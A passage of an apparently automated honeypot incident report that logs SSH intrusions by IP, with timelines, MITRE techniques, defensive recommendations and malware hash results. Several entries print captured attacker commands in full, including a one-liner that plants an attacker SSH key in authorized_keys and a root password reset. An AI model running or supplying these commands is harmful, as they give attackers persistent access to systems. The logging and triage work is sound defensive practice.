| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:36:12` | `cowrie.session.connect` |
| `2026-05-01 22:36:12` | `cowrie.client.version` |
| `2026-05-01 22:36:12` | `cowrie.client.kex` |
| `2026-05-01 22:36:13` | `cowrie.login.success` |
| `2026-05-01 22:36:14` | `cowrie.session.params` |
| `2026-05-01 22:36:14` | `cowrie.command.input` |
| `2026-05-01 22:36:14` | `cowrie.command.failed` |
| `2026-05-01 22:36:14` | `cowrie.log.closed` |
| `2026-05-01 22:36:15` | `cowrie.session.params` |
| `2026-05-01 22:36:15` | `cowrie.command.input` |
| `2026-05-01 22:36:15` | `cowrie.session.file_download` |
| `2026-05-01 22:36:15` | `cowrie.log.closed` |
| `2026-05-01 22:36:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]104` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8558bde3729

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]36` |
| **First Seen** | 2026-05-01 22:36 |
| **Last Seen** | 2026-05-01 22:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:36:18` | `cowrie.session.connect` |
| `2026-05-01 22:36:18` | `cowrie.client.version` |
| `2026-05-01 22:36:19` | `cowrie.client.kex` |
| `2026-05-01 22:36:20` | `cowrie.login.success` |
| `2026-05-01 22:36:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]36` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64b436331bae

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]32` |
| **First Seen** | 2026-05-01 22:37 |
| **Last Seen** | 2026-05-01 22:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:37:20` | `cowrie.session.connect` |
| `2026-05-01 22:37:20` | `cowrie.client.version` |
| `2026-05-01 22:37:20` | `cowrie.client.kex` |
| `2026-05-01 22:37:21` | `cowrie.login.success` |
| `2026-05-01 22:37:22` | `cowrie.session.params` |
| `2026-05-01 22:37:22` | `cowrie.command.input` |
| `2026-05-01 22:37:22` | `cowrie.command.failed` |
| `2026-05-01 22:37:22` | `cowrie.log.closed` |
| `2026-05-01 22:37:23` | `cowrie.session.params` |
| `2026-05-01 22:37:23` | `cowrie.command.input` |
| `2026-05-01 22:37:23` | `cowrie.session.file_download` |
| `2026-05-01 22:37:23` | `cowrie.log.closed` |
| `2026-05-01 22:37:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]32` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba271099dc3b

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:37 |
| **Last Seen** | 2026-05-01 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:37:26` | `cowrie.session.connect` |
| `2026-05-01 22:37:26` | `cowrie.client.version` |
| `2026-05-01 22:37:27` | `cowrie.client.kex` |
| `2026-05-01 22:37:28` | `cowrie.login.success` |
| `2026-05-01 22:37:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5b7d84ded70

| Field | Detail |
|---|---|
| **Source IP** | `14.103.108[.]225` |
| **First Seen** | 2026-05-01 22:43 |
| **Last Seen** | 2026-05-01 22:43 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:aekqdFJEOp6r"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:43:36` | `cowrie.session.connect` |
| `2026-05-01 22:43:36` | `cowrie.client.version` |
| `2026-05-01 22:43:37` | `cowrie.client.kex` |
| `2026-05-01 22:43:37` | `cowrie.login.success` |
| `2026-05-01 22:43:38` | `cowrie.session.params` |
| `2026-05-01 22:43:38` | `cowrie.command.input` |
| `2026-05-01 22:43:38` | `cowrie.command.failed` |
| `2026-05-01 22:43:38` | `cowrie.log.closed` |
| `2026-05-01 22:43:38` | `cowrie.session.params` |
| `2026-05-01 22:43:38` | `cowrie.command.input` |
| `2026-05-01 22:43:38` | `cowrie.session.file_download` |
| `2026-05-01 22:43:38` | `cowrie.log.closed` |
| `2026-05-01 22:43:49` | `cowrie.session.params` |
| `2026-05-01 22:43:49` | `cowrie.command.input` |
| `2026-05-01 22:43:49` | `cowrie.log.closed` |
| `2026-05-01 22:43:49` | `cowrie.session.params` |
| `2026-05-01 22:43:49` | `cowrie.command.input` |
| `2026-05-01 22:43:49` | `cowrie.log.closed` |
| `2026-05-01 22:43:50` | `cowrie.session.params` |
| `2026-05-01 22:43:50` | `cowrie.command.input` |
| `2026-05-01 22:43:50` | `cowrie.session.file_download` |
| `2026-05-01 22:43:50` | `cowrie.log.closed` |
| `2026-05-01 22:43:50` | `cowrie.session.params` |
| `2026-05-01 22:43:50` | `cowrie.command.input` |
| `2026-05-01 22:43:51` | `cowrie.log.closed` |
| `2026-05-01 22:43:51` | `cowrie.session.params` |
| `2026-05-01 22:43:51` | `cowrie.command.input` |
| `2026-05-01 22:43:51` | `cowrie.log.closed` |
| `2026-05-01 22:43:52` | `cowrie.session.params` |
| `2026-05-01 22:43:52` | `cowrie.command.input` |
| `2026-05-01 22:43:52` | `cowrie.command.input` |
| `2026-05-01 22:43:52` | `cowrie.log.closed` |
| `2026-05-01 22:43:52` | `cowrie.session.params` |
| `2026-05-01 22:43:52` | `cowrie.command.input` |
| `2026-05-01 22:43:53` | `cowrie.log.closed` |
| `2026-05-01 22:43:53` | `cowrie.session.params` |
| `2026-05-01 22:43:53` | `cowrie.command.input` |
| `2026-05-01 22:43:53` | `cowrie.log.closed` |
| `2026-05-01 22:43:54` | `cowrie.session.params` |
| `2026-05-01 22:43:54` | `cowrie.command.input` |
| `2026-05-01 22:43:54` | `cowrie.log.closed` |
| `2026-05-01 22:43:54` | `cowrie.session.params` |
| `2026-05-01 22:43:54` | `cowrie.command.input` |
| `2026-05-01 22:43:54` | `cowrie.log.closed` |
| `2026-05-01 22:43:54` | `cowrie.session.params` |
| `2026-05-01 22:43:54` | `cowrie.command.input` |
| `2026-05-01 22:43:55` | `cowrie.log.closed` |
| `2026-05-01 22:43:55` | `cowrie.session.params` |
| `2026-05-01 22:43:55` | `cowrie.command.input` |
| `2026-05-01 22:43:55` | `cowrie.log.closed` |
| `2026-05-01 22:43:56` | `cowrie.session.params` |
| `2026-05-01 22:43:56` | `cowrie.command.input` |
| `2026-05-01 22:43:56` | `cowrie.log.closed` |
| `2026-05-01 22:43:56` | `cowrie.session.params` |
| `2026-05-01 22:43:56` | `cowrie.command.input` |
| `2026-05-01 22:43:56` | `cowrie.log.closed` |
| `2026-05-01 22:43:57` | `cowrie.session.params` |
| `2026-05-01 22:43:57` | `cowrie.command.input` |
| `2026-05-01 22:43:57` | `cowrie.log.closed` |
| `2026-05-01 22:43:57` | `cowrie.session.params` |
| `2026-05-01 22:43:57` | `cowrie.command.input` |
| `2026-05-01 22:43:57` | `cowrie.log.closed` |
| `2026-05-01 22:43:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.108[.]225` to AbuseIPDB if not already reported
- [ ] Block `14.103.108[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e14f56d56d4

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-01 22:48 |
| **Last Seen** | 2026-05-01 22:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:48:31` | `cowrie.session.connect` |
| `2026-05-01 22:48:31` | `cowrie.client.version` |
| `2026-05-01 22:48:31` | `cowrie.client.kex` |
| `2026-05-01 22:48:31` | `cowrie.login.success` |
| `2026-05-01 22:48:32` | `cowrie.session.params` |
| `2026-05-01 22:48:32` | `cowrie.command.input` |
| `2026-05-01 22:48:32` | `cowrie.command.failed` |
| `2026-05-01 22:48:32` | `cowrie.log.closed` |
| `2026-05-01 22:48:32` | `cowrie.session.params` |
| `2026-05-01 22:48:32` | `cowrie.command.input` |
| `2026-05-01 22:48:32` | `cowrie.session.file_download` |
| `2026-05-01 22:48:32` | `cowrie.log.closed` |
| `2026-05-01 22:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-369ec7c9cf4d

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-01 22:48 |
| **Last Seen** | 2026-05-01 22:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:48:35` | `cowrie.session.connect` |
| `2026-05-01 22:48:35` | `cowrie.client.version` |
| `2026-05-01 22:48:35` | `cowrie.client.kex` |
| `2026-05-01 22:48:36` | `cowrie.login.success` |
| `2026-05-01 22:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5c836ebbc19

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-01 22:52 |
| **Last Seen** | 2026-05-01 22:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:52:02` | `cowrie.session.connect` |
| `2026-05-01 22:52:02` | `cowrie.client.version` |
| `2026-05-01 22:52:02` | `cowrie.client.kex` |
| `2026-05-01 22:52:03` | `cowrie.login.success` |
| `2026-05-01 22:52:03` | `cowrie.session.params` |
| `2026-05-01 22:52:03` | `cowrie.command.input` |
| `2026-05-01 22:52:03` | `cowrie.command.failed` |
| `2026-05-01 22:52:03` | `cowrie.log.closed` |
| `2026-05-01 22:52:03` | `cowrie.session.params` |
| `2026-05-01 22:52:03` | `cowrie.command.input` |
| `2026-05-01 22:52:04` | `cowrie.session.file_download` |
| `2026-05-01 22:52:04` | `cowrie.log.closed` |
| `2026-05-01 22:52:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf22f71d0b38

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-01 22:52 |
| **Last Seen** | 2026-05-01 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:52:06` | `cowrie.session.connect` |
| `2026-05-01 22:52:06` | `cowrie.client.version` |
| `2026-05-01 22:52:06` | `cowrie.client.kex` |
| `2026-05-01 22:52:07` | `cowrie.login.success` |
| `2026-05-01 22:52:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e00931065af

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]53` |
| **First Seen** | 2026-05-01 22:52 |
| **Last Seen** | 2026-05-01 22:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo "cat /proc/1/mounts && ls /proc/1/; curl2" | sh, cat /proc/1/mounts && ls /proc/1/; curl2
` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:52:47` | `cowrie.session.connect` |
| `2026-05-01 22:52:47` | `cowrie.client.version` |
| `2026-05-01 22:52:47` | `cowrie.client.kex` |
| `2026-05-01 22:52:48` | `cowrie.login.success` |
| `2026-05-01 22:52:49` | `cowrie.session.params` |
| `2026-05-01 22:52:49` | `cowrie.command.input` |
| `2026-05-01 22:52:49` | `cowrie.command.input` |
| `2026-05-01 22:52:49` | `cowrie.command.failed` |
| `2026-05-01 22:52:49` | `cowrie.log.closed` |
| `2026-05-01 22:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]53` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b55563ad751e

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-01 22:52 |
| **Last Seen** | 2026-05-01 22:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:52:58` | `cowrie.session.connect` |
| `2026-05-01 22:52:58` | `cowrie.client.version` |
| `2026-05-01 22:52:58` | `cowrie.client.kex` |
| `2026-05-01 22:52:58` | `cowrie.login.success` |
| `2026-05-01 22:52:59` | `cowrie.session.params` |
| `2026-05-01 22:52:59` | `cowrie.command.input` |
| `2026-05-01 22:52:59` | `cowrie.command.failed` |
| `2026-05-01 22:52:59` | `cowrie.log.closed` |
| `2026-05-01 22:52:59` | `cowrie.session.params` |
| `2026-05-01 22:52:59` | `cowrie.command.input` |
| `2026-05-01 22:52:59` | `cowrie.session.file_download` |
| `2026-05-01 22:52:59` | `cowrie.log.closed` |
| `2026-05-01 22:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7245c445ba2

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-01 22:53 |
| **Last Seen** | 2026-05-01 22:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:53:01` | `cowrie.session.connect` |
| `2026-05-01 22:53:01` | `cowrie.client.version` |
| `2026-05-01 22:53:02` | `cowrie.client.kex` |
| `2026-05-01 22:53:02` | `cowrie.login.success` |
| `2026-05-01 22:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `129.222.203[.]169` | **30** | 2026-05-01 21:20 | 2026-05-01 21:46 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `76.79.213[.]70` | **30** | 2026-05-01 21:32 | 2026-05-01 22:06 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `109.91.4[.]177` | **21** | 2026-05-01 22:21 | 2026-05-01 22:53 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `177.65.107[.]71` | **11** | 2026-05-01 21:04 | 2026-05-01 21:21 | 22m | 0 | `T1592` | 🟠 MEDIUM |
| `152.89.170[.]227` | **8** | 2026-05-01 22:18 | 2026-05-01 22:53 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `37.25.99[.]250` | **5** | 2026-05-01 21:13 | 2026-05-01 21:21 | 10m | 0 | `T1592` | 🟢 LOW |
| `3.15.169[.]123` | **3** | 2026-05-01 22:51 | 2026-05-01 22:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.210.98[.]130` | **3** | 2026-05-01 22:43 | 2026-05-01 22:51 | 4m | 0 | `T1592` | 🟢 LOW |
| `103.174.153[.]29` | **2** | 2026-05-01 21:05 | 2026-05-01 22:19 | 1m | 0 | `T1592` | 🟢 LOW |
| `14.103.108[.]225` | **2** | 2026-05-01 22:43 | 2026-05-01 22:45 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `200.8.77[.]159` | **2** | 2026-05-01 21:50 | 2026-05-01 21:52 | 4m | 0 | `T1592` | 🟢 LOW |
| `1.222.167[.]7` | 1 | 2026-05-01 21:29 | 2026-05-01 21:29 | 13s | 0 | `T1592` | 🟢 LOW |
| `106.13.144[.]200` | 1 | 2026-05-01 22:23 | 2026-05-01 22:23 | 2s | 0 | `T1592` | 🟢 LOW |
| `116.55.245[.]26` | 1 | 2026-05-01 21:45 | 2026-05-01 21:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.28[.]60` | 1 | 2026-05-01 22:15 | 2026-05-01 22:16 | 59s | 0 | `T1592` | 🟢 LOW |
| `120.48.76[.]190` | 1 | 2026-05-01 21:48 | 2026-05-01 21:49 | 80s | 0 | `T1592` | 🟢 LOW |
| `140.246.137[.]102` | 1 | 2026-05-01 22:18 | 2026-05-01 22:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.194[.]91` | 1 | 2026-05-01 22:51 | 2026-05-01 22:51 | 1s | 0 | `T1592` | 🟢 LOW |
| `36.212.227[.]224` | 1 | 2026-05-01 22:18 | 2026-05-01 22:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.109.104[.]252` | 1 | 2026-05-01 22:49 | 2026-05-01 22:50 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.156.128[.]154` | 1 | 2026-05-01 21:21 | 2026-05-01 21:21 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]155` | 1 | 2026-05-01 21:21 | 2026-05-01 21:21 | 5s | 0 | `T1592` | 🟢 LOW |
| `58.42.8[.]7` | 1 | 2026-05-01 22:28 | 2026-05-01 22:29 | 48s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
